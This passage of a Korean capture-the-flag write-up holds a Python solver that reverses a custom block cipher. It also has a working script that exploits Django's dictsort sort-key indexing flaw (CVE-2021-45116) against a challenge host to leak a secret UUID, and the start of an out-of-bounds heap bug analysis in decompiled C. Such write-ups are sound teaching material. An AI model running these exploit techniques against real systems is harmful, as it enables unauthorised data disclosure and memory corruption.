+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((num <span style="color:#f92672">&gt;&gt;</span> count) <span style="color:#f92672">|</span> (num <span style="color:#f92672">&lt;&lt;</span> (bits <span style="color:#f92672">-</span> count))) <span style="color:#f92672">&amp;</span> ((<span style="color:#ae81ff">0b1</span><span style="color:#f92672">&lt;&lt;</span>bits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Sup3r_s4f3_k3y&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Sup3r_4ws0me_1v&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">16</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pbox <span style="color:#f92672">=</span> [<span style="color:#66d9ef">None</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0x100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> blk <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x100</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> blk:
+</span></span><span style="display:flex;"><span>        q, w <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            tmp <span style="color:#f92672">=</span> (w<span style="color:#f92672">^</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>w)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x1b</span>) <span style="color:#f92672">&amp;</span> mask4
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> w <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                w <span style="color:#f92672">=</span> tmp
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                w <span style="color:#f92672">=</span> (w<span style="color:#f92672">^</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>w)) <span style="color:#f92672">&amp;</span> mask4
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            q <span style="color:#f92672">=</span> (q <span style="color:#f92672">^</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (q<span style="color:#f92672">^</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>q))) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>q) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> (q<span style="color:#f92672">^</span>(<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>q))) <span style="color:#f92672">^</span> q <span style="color:#f92672">^</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>q)))) <span style="color:#f92672">&amp;</span> mask4
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> q <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                q <span style="color:#f92672">^=</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> blk <span style="color:#f92672">==</span> w <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        q <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xFF</span>
+</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> (ROL(q, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">^</span> ROL(q, <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> q <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x63</span> <span style="color:#f92672">^</span> ROL(q, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> ROL(q, <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x63</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    pbox[blk] <span style="color:#f92672">=</span> b
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> pbox
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encRound1</span>(block):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        block[i] <span style="color:#f92672">^=</span> key[i]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encRound2</span>(block):
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, block[:<span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, block[<span style="color:#ae81ff">8</span>:])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">^=</span> ((h <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">19</span>) <span style="color:#f92672">&amp;</span> mask8) <span style="color:#f92672">|</span> ((h <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">13</span>) <span style="color:#f92672">&amp;</span> mask8)
+</span></span><span style="display:flex;"><span>    block <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, h) <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, l)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encRound3</span>(block):
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    block <span style="color:#f92672">=</span> bytearray([block[a[x]] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        block[i] <span style="color:#f92672">=</span> pbox[block[i]]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decRound1</span>(block):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        block[i] <span style="color:#f92672">^=</span> key[i]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decRound2</span>(block):
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, block[:<span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, block[<span style="color:#ae81ff">8</span>:])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">^=</span> ((l <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">19</span>) <span style="color:#f92672">&amp;</span> mask8) <span style="color:#f92672">|</span> ((l <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">13</span>) <span style="color:#f92672">&amp;</span> mask8)
+</span></span><span style="display:flex;"><span>    block <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, h) <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, l)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decRound3</span>(block):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>        block[i] <span style="color:#f92672">=</span> pbox<span style="color:#f92672">.</span>index(block[i])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    block <span style="color:#f92672">=</span> bytearray([block[a<span style="color:#f92672">.</span>index(x)] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>block <span style="color:#f92672">=</span> bytearray(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAABBBBCCCCDDDD&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> decRound1(encRound1(block)) <span style="color:#f92672">==</span> block
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> decRound2(encRound2(block)) <span style="color:#f92672">==</span> block
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> decRound3(encRound3(block)) <span style="color:#f92672">==</span> block
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># ENC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data = bytearray(b&#34;AAAABBBBCCCCDDDD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;.ljust(32, b&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">for i in range(0, len(data), 0x10):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    for j in range(0x10):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if i == 0:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data[j] ^= iv[j]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        else:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data[i+j] ^= data[i+j-16]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    for r in range(0x131):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if r % 3 == 0:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data[i:i+0x10] = encRound1(data[i:i+0x10])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        elif r % 3 == 1:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data[i:i+0x10] = encRound2(data[i:i+0x10])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        elif r % 3 == 2:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data[i:i+0x10] = encRound3(data[i:i+0x10])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">assert data.hex() == &#34;be8744b98893267c3b90cb939e94aeff759b72058e202a6b84ec426c8f0bd092&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DEC</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#data = bytearray(bytes.fromhex(&#34;be8744b98893267c3b90cb939e94aeff759b72058e202a6b84ec426c8f0bd092&#34;)) # for test</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> bytearray(bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#34;483918c5094768c537f60136658101142f7f30d93639b93020d8da002fbd1bcc186192025fe8b247530792b520c6c1a3b83789b93bc54ce30ae5d4f058213d45&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">0x10</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x131</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> decRound1(data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> decRound2(data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> r <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> decRound3(data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            data[j] <span style="color:#f92672">^=</span> iv[j]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            data[i<span style="color:#f92672">+</span>j] <span style="color:#f92672">^=</span> data[i<span style="color:#f92672">+</span>j<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(data<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><hr>
+<h2 id="g-emerald-tablet">G. Emerald Tablet<a hidden class="anchor" aria-hidden="true" href="#g-emerald-tablet">#</a></h2>
+<h3 id="vulnerability-1">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-1">#</a></h3>
+<p>Django의 <code>dictsort</code>에 대해 검색해보니 문제의 환경인 Django 4.0에 적용되는 CVE-2021-45116을 찾을 수 있었다. <code>sort key</code>로 indexing이 가능한 취약점이었고, <code>key.hex.{i}</code>를 통해 <code>key</code>의 <code>i</code>번째의 hex값으로 정렬하도록 할 수 있었다.</p>
+<p><code>uuid4()</code>는 random한 uuid를 생성하는 함수이다. 여러 개의 데이터를 만들고, 정렬하여 flag의 index를 구하면 값을 알 수 있다. 데이터의 수가 많을 수록 정확한 값을 찾을 수 있다.</p>
+<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup <span style="color:#66d9ef">as</span> bs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#url = &#34;http://localhost:59909&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://host3.dreamhack.games:16320&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mag <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_many</span>(n):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/upload/&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;inscriber&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;data&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>}, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">302</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;ERROR!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flag_idx</span>(sort):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/list/&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;sort&#34;</span>: sort})
+</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> bs(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#34;html.parser&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    elems <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>select(<span style="color:#e6db74">&#34;tbody &gt; tr&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, e <span style="color:#f92672">in</span> enumerate(elems):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> e<span style="color:#f92672">.</span>select_one(<span style="color:#e6db74">&#34;th&#34;</span>)<span style="color:#f92672">.</span>text <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RFC-4122
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">low = uuid.UUID(&#34;00000000-0000-4000-8000-000000000000&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">high = uuid.UUID(&#34;FFFFFFFF-FFFF-4FFF-BFFF-FFFFFFFFFFFF&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Upload Many Start&#34;</span>)
+</span></span><span style="display:flex;"><span>upload_many(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">*</span> mag)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Upload Many Done&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">12</span>:
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;4&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
+</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> flag_idx(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;key.hex.</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">/</span> mag
+</span></span><span style="display:flex;"><span>        leak <span style="color:#f92672">=</span> round(idx<span style="color:#f92672">/</span><span style="color:#ae81ff">0x40</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> hex(leak)[<span style="color:#ae81ff">2</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        idx <span style="color:#f92672">=</span> flag_idx(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;key.hex.</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">/</span> mag
+</span></span><span style="display:flex;"><span>        leak <span style="color:#f92672">=</span> round(idx<span style="color:#f92672">/</span><span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> hex(leak)[<span style="color:#ae81ff">2</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(i, result)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(uuid<span style="color:#f92672">.</span>UUID(result))
+</span></span></code></pre></div><hr>
+<h2 id="k-dlmalloc">K. dlmalloc<a hidden class="anchor" aria-hidden="true" href="#k-dlmalloc">#</a></h2>
+<h3 id="vulnerability-2">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-2">#</a></h3>
+<p><code>3. Clear</code> 메뉴에서 memset을 할 때 size에 대한 검증이 없어 OOB가 발생한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">storeClear</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> Store;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> Index;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> n;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>  Store <span style="color:#f92672">=</span> readStore();
+</span></span><span style="display:flex;"><span>  Index <span style="color:#f92672">=</span> readIndex(Store);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Size? &#34;</span>);
+</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> readUint64();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> memset((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> Index <span style="color:#f92672">+</span> Store), <span style="color:#ae81ff">0</span>, n);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>2. Write</code>메뉴에서 Index를 읽어 원하는 위치에 값을 쓸 수 있다. 이때, <code>malloc_usable_size(store)</code>를 이용해 index의 범위를 검증하게 되는데 여기서 취약점이 발생하게 된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">storeWrite</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> Store;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> Index;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Store <span style="color:#f92672">=</span> readStore();
+</span></span><span style="display:flex;"><span>  Index <span style="color:#f92672">=</span> readIndex(Store);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Value? &#34;</span>);
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> readUint64();
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(Store <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> Index) <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">readIndex</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>store)
+</span></span><span style="display:flex;"><span>{
